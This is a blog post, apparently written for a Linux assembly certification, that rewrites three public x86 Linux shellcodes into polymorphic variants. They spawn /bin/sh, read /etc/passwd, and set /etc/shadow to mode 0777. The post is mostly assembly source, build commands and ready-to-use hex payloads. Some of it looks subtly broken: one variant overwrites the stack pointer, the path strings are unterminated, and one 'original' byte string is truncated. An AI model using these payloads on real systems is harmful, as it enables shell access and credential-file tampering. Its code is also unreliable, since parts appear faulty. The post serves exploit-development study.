---
layout: post
title: Polymorphic shellcodes
categories: [re,exploit]
tags: [slae, osce]
fullview: false
comments: true
---
# Assignment #6
> This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:
> http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/
> Student ID: SLAE-1228

We have already seen a [great example of polymorphic encoding](https://marcosvalle.github.io/re/exploit/2018/08/25/shikata-ga-nai.html) when we decided to take a look at Shikata-Ga-Nai. Nevertheless, it's time to see how can we create a polymorphic version of the following 3 shellcodes.

All the source codes can be compiled using:

	nasm -f elf32 shellcode.s -o shellcode.o
	ld -m elf_i386 shellcode.o -o shellcode

# Shellcode 1: Linux/x86 - execve(/bin/sh) - 25 bytes
The original version can be found [here](http://shell-storm.org/shellcode/files/shellcode-585.php). It is interesting because the author used the [JMP/CALL/POP](https://marcosvalle.github.io/osce/2018/05/06/JMP-CALL-POP-technique.html) technique.

```
0:  eb 0b                   jmp    0xd
2:  5b                      pop    ebx
3:  31 c0                   xor    eax,eax
5:  31 c9                   xor    ecx,ecx
7:  31 d2                   xor    edx,edx
9:  b0 0b                   mov    al,0xb
b:  cd 80                   int    0x80
d:  e8 f0 ff ff ff          call   0x2
12: 2f                      das
13: 62 69 6e                bound  ebp,QWORD PTR [ecx+0x6e]
16: 2f                      das
17: 73 68                   jae    0x81
```

Modified source code:

```
section .text
	global _start

_start:

	jmp short two

one:
	pop    ebx
	xor    eax,eax
	cdq    
	xchg   ecx,eax
	mov    al,0xb
	int    0x80
two:
	call one
	shell: db '/bin/sh'
```

Retrieving the opcodes:

	objdump -d ./shell|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
	"\xeb\x09\x5b\x31\xc0\x99\x91\xb0\x0b\xcd\x80\xe8\xf2\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68"

Original version:
	
	"\xEB\x0B\x5B\x31\xC0\x31\xC9\x31\xD2\xB0\x0B\xCD\x80\xE8\xF0\xFF\xFF\xFF\x2F\x62\x69\x6E\x2F\x73\x68"

Modified:

	"\xEB\x09\x5B\x31\xC0\x99\x91\xB0\x0B\xCD\x80\xE8\xF2\xFF\xFF\xFF\x2F\x62\x69\x6E\x2F\x73\x68"


This is **2 bytes smaller**! Bonus points ya'll o/.

# Shellcode 2: Linux/x86 - File Reader /etc/passwd - 65 bytes
The original version can be found [here](http://shell-storm.org/shellcode/files/shellcode-73.php). Also uses JMP/CALL/POP.

I converted it to Intel syntax (can't stand AT&T, ugh):

	objdump -D -M intel test

```
    2040:	31 c0                	xor    eax,eax
    2042:	31 db                	xor    ebx,ebx
    2044:	31 c9                	xor    ecx,ecx
    2046:	31 d2                	xor    edx,edx
    2048:	eb 32                	jmp    207c <buf+0x3c>
    204a:	5b                   	pop    ebx
    204b:	b0 05                	mov    al,0x5
    204d:	31 c9                	xor    ecx,ecx
    204f:	cd 80                	int    0x80
    2051:	89 c6                	mov    esi,eax
    2053:	eb 06                	jmp    205b <buf+0x1b>
    2055:	b0 01                	mov    al,0x1
    2057:	31 db                	xor    ebx,ebx
    2059:	cd 80                	int    0x80
    205b:	89 f3                	mov    ebx,esi
    205d:	b0 03                	mov    al,0x3
    205f:	83 ec 01             	sub    esp,0x1
    2062:	8d 0c 24             	lea    ecx,[esp]
    2065:	b2 01                	mov    dl,0x1
    2067:	cd 80                	int    0x80
    2069:	31 db                	xor    ebx,ebx
    206b:	39 c3                	cmp    ebx,eax
    206d:	74 e6                	je     2055 <buf+0x15>
    206f:	b0 04                	mov    al,0x4
    2071:	b3 01                	mov    bl,0x1
    2073:	b2 01                	mov    dl,0x1
    2075:	cd 80                	int    0x80
    2077:	83 c4 01             	add    esp,0x1
    207a:	eb df                	jmp    205b <buf+0x1b>
    207c:	e8 c9 ff ff ff       	call   204a <buf+0xa>
    2081:	2f                   	das    
    2082:	65 74 63             	gs je  20e8 <__TMC_END__+0x58>
    2085:	2f                   	das    
    2086:	70 61                	jo     20e9 <__TMC_END__+0x59>
    2088:	73 73                	jae    20fd <__TMC_END__+0x6d>
    208a:	77 64                	ja     20f0 <__TMC_END__+0x60>
```

Original shellcode:

	\x31\xC0\x31\xDB\x31\xC9\x31\xD2\xEB\x32\x5B\xB0\x05\x31\xC9\xCD\x80\x89\xC6\xEB\x06\xB0\x01\x31\xDB\xCD\x80\x89\xF3\xB0\x03\x83\xEC\x01\x8D\x0C\x24\xB2\x01\xCD\x80\x31\xDB\x39\xC3\x74\xE6\xB0\x04\xB3\x01\xB2\x01\xCD\x80\x83\xC4\x01\xEB\xDF\xE8\xC9\xFF\xFF\xFF\xEC\xAD

Modified source code (converted to Intel syntax):

```
section .text
	global _start

_start:
        xor     ebx,ebx
        mul     ebx
        cdq
        push    ebx
        pop     ecx
	jmp	two

one:
	pop	ebx
	nop		;useless instruction
	mov	al, 0x5
	xor	ecx, ecx
	int	0x80
	
	mov	edi, eax
	jmp	read

exit:
	mov al, 0x1
	xor	ebx, ebx
	int	0x80

read:
	mov	ebx, edi
	mov al, 0x3
	sub	esp, 0x1
	lea	ecx, [esp]
	nop		;useless instruction
	mov	dl, 0x1
	int	0x80

	xor	ebx, ebx
	cmp	ebx, eax
	je	exit

	push    0x4
        pop     eax
        push    0x1
        pop     ebx
        push    0x1
        pop     edx
	mov	al, 0x4
	mov	bl, 0x1
	mov	dl, 0x1
	int	0x80
	
	add	esp, 0x1
	jmp	read

two:
	call	one
	shell: db	'/etc/passwd'
```

Modified shellcode:

	objdump -d ./shell|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
	\x31\xdb\xf7\xe3\x99\x53\x59\xeb\x3d\x5b\x90\xb0\x05\x31\xc9\xcd\x80\x89\xc7\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xfb\xb0\x03\x83\xec\x01\x8d\x0c\x24\x90\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe5\x6a\x04\x58\x6a\x01\x5b\x6a\x01\x5a\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xd5\xe8\xbe\xff\xff\xff\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64

That is approximately **128%** the size of the original version.

# Shellcode 3: Linux/x86 - chmod(/etc/shadow, 0777) - 33 bytes
[This](http://shell-storm.org/shellcode/files/shellcode-590.php) one is interesting exactly because it does not use good and old JMP/CALL/POP technique. Well, not for a long time, huhu.

Original version:

```
xor %eax,%eax
push %eax
mov $0xf,%al
push $0x776f6461
push $0x68732f63
push $0x74652f2f
mov %esp,%ebx
xor %ecx,%ecx
mov $0x1ff,%cx
int $0x80
inc %eax
int $0x80
```

Original shellcode:

	\x31\xc0\x50\xb0\x0f\x68\x61\x64\x6f\x77\x68\x63\x2f\x73\x68\x68\x2f\x2f\x65\x74\x89\xe3\x31\xc9\x66\xb9\xff\x01\xcd\x80\x40\xcd\x80
	
Modified source code (Intel ftw):

```
section .text
	global _start

_start:

	jmp short two
	nop	;useless instruction
	nop	;useless instruction

one:
	pop ebx
	xor ecx,ecx
	mul eax
	push ecx
	mov al, 0xf
	mov esp,ebx
	mov cx, 0x1ff
	int 0x80

	inc eax
	int 0x80
two:
	call one
	shell: db '/etc/shadow'
```

Modified shellcode:

	\xeb\x15\x90\x90\x5b\x31\xc9\xf7\xe0\x51\xb0\x0f\x89\xdc\x66\xb9\xff\x01\xcd\x80\x40\xcd\x80\xe8\xe8\xff\xff\xff\x2f\x65\x74\x63\x2f\x73\x68\x61\x64\x6f\x77

Even with the 2 NOPs the final shellcode is approximatley **118%** of the original one.
